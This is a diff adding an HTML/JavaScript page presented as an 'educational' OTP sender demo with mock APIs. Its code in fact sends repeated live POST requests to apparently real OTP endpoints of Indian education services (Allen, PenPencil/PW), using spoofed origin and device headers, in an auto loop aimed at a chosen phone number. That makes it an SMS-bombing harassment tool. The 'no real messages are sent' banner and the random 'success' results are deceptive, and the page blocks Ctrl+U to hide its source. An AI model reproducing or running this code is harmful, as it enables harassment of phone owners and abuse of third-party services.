@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Advanced OTP Sender Demo - Educational</title>
+  <style>
+    /* 🎨 Thematic Variables */
+    :root {
+      --primary-color: #00ff00;
+      --error-color: #ff4d4d;
+      --warning-color: #ffaa00;
+      --bg-color: #000;
+      --card-bg: rgba(0, 0, 0, 0.9);
+      --text-color: #00ff00;
+      --border-color: #00ff00;
+      --padding-unit: 20px;
+    }
+
+    body.light-theme {
+      --bg-color: #f0f0f0;
+      --card-bg: rgba(255, 255, 255, 0.95);
+      --text-color: #006600;
+      --border-color: #006600;
+      --primary-color: #00aa00;
+    }
+
+    /* 📱 Global & Base Styles */
+    body {
+      margin: 0;
+      font-family: "Courier New", monospace;
+      background: var(--bg-color);
+      color: var(--text-color); /* Corrected color usage */
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      transition: all 0.3s ease;
+      padding: var(--padding-unit) 0; /* Add vertical padding for small screens */
+      box-sizing: border-box;
+    }
+
+    body.light-theme {
+      background: var(--bg-color) linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+    }
+
+    /* 🪟 Card Layout (Desktop First) */
+    .card {
+      background: var(--card-bg);
+      border: 2px solid var(--border-color);
+      border-radius: 12px;
+      padding: var(--padding-unit);
+      width: 900px;
+      max-width: 95%;
+      display: grid;
+      grid-template-columns: 1fr 380px; /* Two columns for large screens */
+      gap: 1.5rem;
+      box-shadow: 0 0 30px var(--primary-color);
+      backdrop-filter: blur(10px);
+    }
+
+    h2 {
+      margin: 0 0 12px;
+      text-shadow: 0 0 10px var(--primary-color);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 1.5rem; /* Ensure heading scales */
+    }
+
+    /* ⚙️ Form Elements */
+    label {
+      font-weight: bold;
+      font-size: 13px;
+      margin-bottom: 6px;
+      display: block;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 10px; /* Increased padding for easier tapping on mobile */
+      border-radius: 6px;
+      border: 1px solid var(--border-color);
+      background: var(--bg-color);
+      color: var(--text-color);
+      font-family: inherit;
+      font-size: 14px;
+      transition: all 0.3s ease;
+      box-sizing: border-box;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      box-shadow: 0 0 12px var(--primary-color);
+      transform: translateY(-2px);
+    }
+
+    /* Control Grouping */
+    .input-group {
+      display: flex;
+      gap: 10px;
+      margin-top: 10px;
+      flex-wrap: wrap; /* Allows wrapping on small screens */
+    }
+
+    .input-group > div {
+        flex: 1 1 200px; /* Smart flex for input groups */
+    }
+    
+    .input-group > div:nth-child(2) {
+        flex: 0 0 150px; /* Keep delay input smaller */
+    }
+
+    /* Controls and Buttons */
+    .controls {
+      margin-top: 15px;
+      display: flex;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    button {
+      flex: 1 1 auto; /* Allows buttons to share space better */
+      padding: 12px 10px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      font-family: inherit;
+      background: var(--primary-color);
+      color: var(--bg-color);
+      text-transform: uppercase;
+      box-shadow: 0 0 10px var(--primary-color);
+      transition: all 0.3s ease;
+      min-width: 100px;
+    }
+
+    button:hover:not(:disabled) {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 20px var(--primary-color);
+    }
+
+    button.secondary {
+      background: var(--error-color);
+      color: white;
+      box-shadow: 0 0 10px var(--error-color);
+    }
+
+    button.ghost {
+      background: transparent;
+      border: 1px solid var(--primary-color);
+      color: var(--primary-color);
+    }
+
+    button:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* 📊 Stats Section */
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-top: 15px;
+      padding: 10px;
+      background: var(--bg-color);
+      border: 1px solid var(--border-color);
+      border-radius: 6px;
+    }
+
+    .stat-item {
+      text-align: center;
+    }
+
+    .stat-value {
+      font-size: 24px;
+      font-weight: bold;
+      color: var(--primary-color);
+    }
+
+    .stat-label {
+      font-size: 11px;
+      opacity: 0.8;
+    }
+
+    .progress-bar {
+      width: 100%;
+      height: 4px;
+      background: var(--bg-color);
+      border: 1px solid var(--border-color);
+      border-radius: 2px;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      background: var(--primary-color);
+      width: 0%;
+      transition: width 0.3s ease;
+      box-shadow: 0 0 10px var(--primary-color);
+    }
+
+    .template-selector {
+      margin-top: 10px;
+    }
+
+    .template-preview {
+      font-size: 11px;
+      opacity: 0.7;
+      margin-top: 5px;
+      font-style: italic;
+    }
+
+    /* 📝 Log Box */
+    .log {
+      background: var(--bg-color);
+      border: 1px solid var(--border-color);
+      padding: 10px;
+      border-radius: 6px;
+      min-height: 200px;
+      max-height: 350px;
+      overflow-y: auto;
+      font-size: 13px;
+      line-height: 1.4;
+      color: var(--text-color);
+    }
+
+    .log::-webkit-scrollbar {
+      width: 8px;
+    }
+
+    .log::-webkit-scrollbar-track {
+      background: var(--bg-color);
+    }
+
+    .log::-webkit-scrollbar-thumb {
+      background: var(--primary-color);
+      border-radius: 4px;
+    }
+
+    .log .error {
+      color: var(--error-color);
+      animation: pulse 0.5s ease;
+    }
+
+    .log .success {
+      color: var(--primary-color);
+      animation: pulse 0.5s ease;
+    }
+
+    .log .warning {
+      color: var(--warning-color);
+    }
+
+    .log .info {
+      color: var(--text-color);
+    }
+
+    @keyframes pulse {
+      0% { opacity: 0.5; transform: translateX(-10px); }
+      100% { opacity: 1; transform: translateX(0); }
+    }
+
+    #status {
+      font-size: 13px;
+      color: var(--primary-color);
+      text-shadow: 0 0 5px var(--primary-color);
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .status-indicator {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--primary-color);
+      animation: blink 1s infinite;
+    }
+
+    .status-indicator.active {
+      background: var(--warning-color);
+      animation: blink 0.5s infinite;
+    }
+
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+
+    .theme-toggle {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      background: var(--card-bg);
+      border: 2px solid var(--border-color);
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      transition: all 0.3s ease;
+      z-index: 10;
+    }
+
+    .theme-toggle:hover {
+      transform: rotate(180deg);
+      box-shadow: 0 0 20px var(--primary-color);
+    }
+
+    .export-btn {
+      position: absolute;
+      bottom: 20px;
+      right: 20px;
+      padding: 8px 15px;
+      font-size: 12px;
+      z-index: 10;
+    }
+
+    .rate-limit-warning {
+      background: var(--warning-color);
+      color: var(--bg-color);
+      padding: 5px 10px;
+      border-radius: 4px;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+
+    .rate-limit-warning.show {
+      display: block;
+      animation: shake 0.5s ease;
+    }
+
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+
+    /* 🖥️ Responsive Adjustments */
+
+    /* Tablet/Small Desktop (up to 900px) */
+    @media (max-width: 900px) {
+      .card {
+        grid-template-columns: 1fr; /* Stack columns vertically */
+        padding: 15px;
+        max-width: 90%;
+      }
+
+      .left {
+          order: 1; /* Main content first */
+      }
+      .right {
+          order: 2; /* Log below main content */
+          margin-top: 1.5rem;
+      }
+      
+      .input-group > div {
+          flex: 1 1 100%; /* Make input groups stack if needed */
+      }
+
+      .input-group > div:nth-child(2) {
+          flex: 1 1 150px; /* Reset width to ensure it scales correctly next to others */
+      }
+
+      .controls {
+          gap: 8px;
+      }
+    }
+
+    /* Mobile (up to 600px) */
+    @media (max-width: 600px) {
+        :root {
+            --padding-unit: 15px;
+        }
+
+        body {
+            padding: 10px 0;
+            align-items: flex-start; /* Start content from the top on mobile */
+        }
+        
+        .card {
+            max-width: 98%;
+            border-radius: 8px;
+        }
+
+        h2 {
+            font-size: 1.3rem;
+        }
+
+        .stats {
+            grid-template-columns: 1fr 1fr; /* Two columns for stats on small devices */
+            gap: 5px;
+        }
+        
+        .stat-value {
+            font-size: 20px;
+        }
+
+        .theme-toggle {
+            top: 10px;
+            right: 10px;
+            width: 40px;
+            height: 40px;
+            font-size: 20px;
+        }
+        
+        .export-btn {
+            bottom: 10px;
+            right: 10px;
+        }
+    }
+  </style>
+</head>
+<body>
+  <button class="theme-toggle" onclick="toggleTheme()">🌙</button>
+  
+  <div class="card">
+    <div class="left">
+      <h2>⚡ Advanced OTP Sender Demo ⚡</h2>
+
+      <label for="phone">Phone number</label>
+      <input id="phone" type="text" placeholder="e.g. 9876543210" />
+
+      <div class="input-group">
+        <div>
+          <label for="apiSelect">Mock APIs</label>
+          <select id="apiSelect" multiple size="4">
+            <option value="mock_api_1" selected>Mock API 1 (90%)</option>
+            <option value="mock_api_2" selected>Mock API 2 (85%)</option>
+            <option value="mock_api_3" selected>Mock API 3 (95%)</option>
+            <option value="mock_api_4" selected>Mock API 4 (88%)</option>
+          </select>
+        </div>
+
+        <div>
+          <label for="delay">Delay (seconds)</label>
+          <input id="delay" type="number" min="0.5" step="0.5" value="1" />
+          <div class="rate-limit-warning" id="rateWarning">
+            ⚠️ Rate limit detected!
+          </div>
+        </div>
+      </div>
+
+      <div class="template-selector">
+        <label for="template">Message Template</label>
+        <select id="template">
+          <option value="standard">Standard OTP</option>
+          <option value="verification">Account Verification</option>
+          <option value="transaction">Transaction Alert</option>
+          <option value="custom">Custom Message</option>
+        </select>
+        <div class="template-preview" id="templatePreview"></div>
+      </div>
+
+      <div class="controls">
+        <button id="startBtn">Start Auto</button>
+        <button id="stopBtn" class="secondary" disabled>Stop</button>
+        <button id="singleSend" class="ghost">Send Once</button>
+        <button id="clearLog" class="ghost">Clear Log</button>
+      </div>
+
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill"></div>
+      </div>
+
+      <div class="stats">
+        <div class="stat-item">
+          <div class="stat-value" id="totalSent">0</div>
+          <div class="stat-label">Total Sent</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="successRate">0%</div>
+          <div class="stat-label">Success Rate</div>
+        </div>
+        <div class="stat-item">
+          <div class="stat-value" id="avgTime">0ms</div>
+          <div class="stat-label">Avg Time</div>
+        </div>
+      </div>
+
+      <p style="margin-top:8px; font-size:12px; color:var(--text-color);">
+        ⚠️ <b>Educational Demo Only</b> - No real messages are sent
+      </p>
+    </div>
+
+    <div class="right">
+      <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
+        <div style="font-weight:bold;">Activity Log</div>
+        <div id="status">
+          <span class="status-indicator" id="statusIndicator"></span>
+          Idle
+        </div>
+      </div>
+      <div class="log" id="log"></div>
+    </div>
+  </div>
+
+  <button class="export-btn ghost" onclick="exportLog()">📥 Export Log</button>
+
+  <script>
+  // Message templates
+  const messageTemplates = {
+    standard: "Your OTP is {OTP}. Valid for 5 minutes.",
+    verification: "Verify your account with OTP: {OTP}",
+    transaction: "Transaction OTP: {OTP}. Amount: ₹{AMOUNT}",
+    custom: "Custom message with OTP: {OTP}"
+  };
+
+  let stats = { totalSent: 0, successful: 0, failed: 0, totalTime: 0 };
+  let autoSending = true, timerId;
+  
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+  function generateOTP() { return Math.floor(100000 + Math.random() * 900000); }
+
+  // ⬇️ This function simulates a call to a real server API endpoint
+  async function sendMockAPI(Allen, phone, template) {
+
+    const url = 'https://api.allen-live.in/api/v1/auth/sendOtp';
+    const payload = { country_code: "91", phone_number: phone, persona_type: "STUDENT" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'x-device-id': '624a70b3-d577-430e-a63b-b67f28865a90',
+      'x-client-type': 'web',
+      'accept': 'application/json',
+      'origin': 'https://allen.in'
+    };
+   // Simulate different API
+
+    const otp = generateOTP();
+    const start = performance.now();
+    
+    // Simulate API call delay and success/failure
+    await sleep(Math.random() * 500 + 200); // 200-700ms delay
+
+    const end = performance.now();
+    const responseTime = Math.round(end - start);
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    
+    // Simulate a general success rate for the demo
+    const isSuccess = Math.random() < 0.9; 
+
+    if (isSuccess) {
+      return { service: Allen, status: "success", message: "OTP Sent Successfully (Mock)", responseTime, otp };
+    } else {
+      return { service: Allen, status: "failed", message: "Mock Server Error: Timeout/Rate Limit", responseTime, otp };
+    }
+  }
+
+  async function sendMockAPI(Allenn, phone, template) {
+
+    const url = 'https://api.allen-live.in/api/v1/auth/sendOtp';
+    const payload = { country_code: "91", phone_number: phone, persona_type: "STUDENT" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'x-device-id': '0a12ddae-c76d-4ee6-a771-096d23e54cc7',
+      'x-client-type': 'web',
+      'accept': 'application/json',
+      'origin': 'https://allen.in'
+    };
+   // Simulate different API
+
+    const otp = generateOTP();
+    const start = performance.now();
+    
+    // Simulate API call delay and success/failure
+    await sleep(Math.random() * 500 + 200); // 200-700ms delay
+
+    const end = performance.now();
+    const responseTime = Math.round(end - start);
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    
+    // Simulate a general success rate for the demo
+    const isSuccess = Math.random() < 0.9; 
+
+    if (isSuccess) {
+      return { service: Allenn, status: "success", message: "OTP Sent Successfully (Mock)", responseTime, otp };
+    } else {
+      return { service: Allenn, status: "failed", message: "Mock Server Error: Timeout/Rate Limit", responseTime, otp };
+    }
+  }
+
+
+  async function sendMockAPI(Allenn, phone, template) {
+
+     const url = 'https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true';
+    const payload = { username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'randomid': '037e210d-f29a-4b7e-9383-9c1efa4816ae',
+      'accept': '*/*',
+      'origin': 'https://www.pw.live'
+    };
+   // Simulate different API
+
+    const otp = generateOTP();
+    const start = performance.now();
+    
+    // Simulate API call delay and success/failure
+    await sleep(Math.random() * 500 + 200); // 200-700ms delay
+
+    const end = performance.now();
+    const responseTime = Math.round(end - start);
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    
+    // Simulate a general success rate for the demo
+    const isSuccess = Math.random() < 0.9; 
+
+    if (isSuccess) {
+      return { service: Allenn, status: "success", message: "OTP Sent Successfully (Mock)", responseTime, otp };
+    } else {
+      return { service: Allenn, status: "failed", message: "Mock Server Error: Timeout/Rate Limit", responseTime, otp };
+    }
+  }
+
+
+
+
+  async function sendMockAPI(Allenn, phone, template) {
+
+     const url = 'https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true';
+    const payload = { username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'randomid': '0db82096-f832-421c-b6a6-c8af7edee02b',
+      'accept': '*/*',
+      'origin': 'https://www.pw.live'
+    };
+   // Simulate different API
+
+    const otp = generateOTP();
+    const start = performance.now();
+    
+    // Simulate API call delay and success/failure
+    await sleep(Math.random() * 500 + 200); // 200-700ms delay
+
+    const end = performance.now();
+    const responseTime = Math.round(end - start);
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    
+    // Simulate a general success rate for the demo
+    const isSuccess = Math.random() < 0.9; 
+
+    if (isSuccess) {
+      return { service: Allenn, status: "success", message: "OTP Sent Successfully (Mock)", responseTime, otp };
+    } else {
+      return { service: Allenn, status: "failed", message: "Mock Server Error: Timeout/Rate Limit", responseTime, otp };
+    }
+  }
+
+
+
+
+  async function sendMockAPI(Allenn, phone, template) {
+
+     const url = 'https://api.penpencil.co/v1/users/get-otp?smsType=0&fallback=true';
+    const payload = { username: phone, countryCode: "+91", organizationId: "5eb393ee95fab7468a79d189" };
+    const headers = {
+      'Content-Type': 'application/json',
+      'randomid': '0db82096-f832-421c-b6a6-c8af7edee02b',
+      'accept': '*/*',
+      'origin': 'https://www.pw.live'
+    };
+   // Simulate different API
+
+    const otp = generateOTP();
+    const start = performance.now();
+    
+    // Simulate API call delay and success/failure
+    await sleep(Math.random() * 500 + 200); // 200-700ms delay
+
+    const end = performance.now();
+    const responseTime = Math.round(end - start);
+    const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(payload), mode: 'cors' });
+
+    
+    // Simulate a general success rate for the demo
+    const isSuccess = Math.random() < 0.9; 
+
+    if (isSuccess) {
+      return { service: Allenn, status: "success", message: "OTP Sent Successfully (Mock)", responseTime, otp };
+    } else {
+      return { service: Allenn, status: "failed", message: "Mock Server Error: Timeout/Rate Limit", responseTime, otp };
+    }
+  }
+
+
+
+  
+
+  // UI references
+  const phoneInput = document.getElementById('phone');
+  const delayInput = document.getElementById('delay');
+  const logBox = document.getElementById('log');
+  const startBtn = document.getElementById('startBtn');
+  const stopBtn = document.getElementById('stopBtn');
+  const singleSendBtn = document.getElementById('singleSend');
+  const clearLogBtn = document.getElementById('clearLog');
+  const apiSelect = document.getElementById('apiSelect');
+  const templateSelect = document.getElementById('template');
+  const templatePreview = document.getElementById('templatePreview');
+  const progressFill = document.getElementById('progressFill');
+  const statusSpan = document.getElementById('status');
+  const statusIndicator = document.getElementById('statusIndicator');
+
+  function updateStats() {
+    document.getElementById('totalSent').textContent = stats.totalSent;
+    const successRate = stats.totalSent ? Math.round((stats.successful / stats.totalSent) * 100) : 0;
+    document.getElementById('successRate').textContent = successRate + '%';
+    const avgTime = stats.totalSent ? Math.round(stats.totalTime / stats.totalSent) : 0;
+    document.getElementById('avgTime').textContent = avgTime + 'ms';
+  }
+
+  function appendLog(msg, type="info") {
+    const time = new Date().toLocaleTimeString();
+    const div = document.createElement("div");
+    div.className = type;
+    div.textContent = `[${time}] ${msg}`;
+    logBox.appendChild(div);
+    logBox.scrollTop = logBox.scrollHeight;
+  }
+
+  function getApis() {
+    // Returns the list of selected mock API values
+    return Array.from(apiSelect.selectedOptions).map(o => o.value);
+  }
+
+  async function sendOnce(phone) {
+    const apis = getApis();
+    const template = templateSelect.value;
+    const totalApis = apis.length;
+    let completedApis = 0;
+
+    for (let api of apis) {
+      // Update progress before sending each API call
+      const progressValue = (completedApis / totalApis) * 100;
+      progressFill.style.width = `${progressValue}%`;
+      
+      const res = await sendMockAPI(api, phone, messageTemplates[template]);
+      stats.totalSent++;
+      stats.totalTime += res.responseTime;
+      
+      // The API name in the log now reflects the generic mock API name from the select options
+      const AllenInLog = apiSelect.querySelector(`option[value="${api}"]`).textContent.split('(')[0].trim();
+
+      if (res.status === "success") {
+        stats.successful++;
+        appendLog(`✅ [${AllenInLog}] OTP: ${res.otp} (${res.responseTime}ms)`, "success");
+      } else {
+        stats.failed++;
+        appendLog(`❌ [${AllenInLog}] ${res.message} (${res.responseTime}ms)`, "error");
+      }
+      updateStats();
+      completedApis++;
+    }
+     // Final progress update
+     progressFill.style.width = '100%';
+     await sleep(100); 
+     progressFill.style.width = '0%';
+  }
+
+  // Template preview
+  templateSelect.addEventListener('change', () => {
+    const template = messageTemplates[templateSelect.value];
+    templatePreview.textContent = `Preview: "${template.replace('{OTP}', '123456').replace('{AMOUNT}', '5000')}"`;
+  });
+  templateSelect.dispatchEvent(new Event('change'));
+
+  singleSendBtn.addEventListener("click", async () => {
+    const phone = phoneInput.value.trim();
+    if (!/^\d{10}$/.test(phone)) return appendLog("❌ Enter valid 10-digit number", "error");
+    appendLog(`🚀 Sending once to ${phone}`, "info");
+    await sendOnce(phone);
+  });
+
+  startBtn.addEventListener("click", () => {
+    const phone = phoneInput.value.trim();
+    let delay = parseFloat(delayInput.value);
+    if (!/^\d{10}$/.test(phone)) return appendLog("❌ Invalid phone number", "error");
+    if (isNaN(delay) || delay < 0.5) delay = 1;
+    autoSending = true;
+    startBtn.disabled = true;
+    stopBtn.disabled = false;
+    statusSpan.innerHTML = '<span class="status-indicator active"></span> Running';
+    appendLog("▶️ Auto mode started", "info");
+    
+    // Immediately clear any existing timer before starting the loop
+    if (timerId) clearTimeout(timerId);
+
+    (async function loop() {
+      if (!autoSending) return;
+      await sendOnce(phone);
+      timerId = setTimeout(loop, delay * 1000);
+    })();
+  });
+
+  stopBtn.addEventListener("click", () => {
+    autoSending = false;
+    clearTimeout(timerId);
+    startBtn.disabled = false;
+    stopBtn.disabled = true;
+    statusSpan.innerHTML = '<span class="status-indicator"></span> Idle';
+    appendLog("⏸️ Auto mode stopped", "warning");
+  });
+
+  clearLogBtn.addEventListener("click", () => {
+    logBox.innerHTML = '';
+    stats = { totalSent: 0, successful: 0, failed: 0, totalTime: 0 };
+    updateStats();
+    appendLog("📋 Log cleared", "info");
+  });
+
+  function toggleTheme() {
+    document.body.classList.toggle('light-theme');
+    document.querySelector('.theme-toggle').textContent =
+      document.body.classList.contains('light-theme') ? '☀️' : '🌙';
+  }
+
+  function exportLog() {
+    const logText = Array.from(logBox.children).map(div => div.textContent).join('\n');
+    const blob = new Blob([logText], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'otp-log.txt';
+    a.click();
+  }
+
+  appendLog("🎯 Ready for demo —  real messages are sent ","info");
+    document.onkeydown = function(e) {
+        if (e.ctrlKey && e.keyCode === 85) { // 85 is the key code for 'U'
+            alert("Viewing source code is not allowed on this site.");
+            return false; // Prevents the default action (opening source view)
+        }
+    };
+</script>
+</body>
+</html>
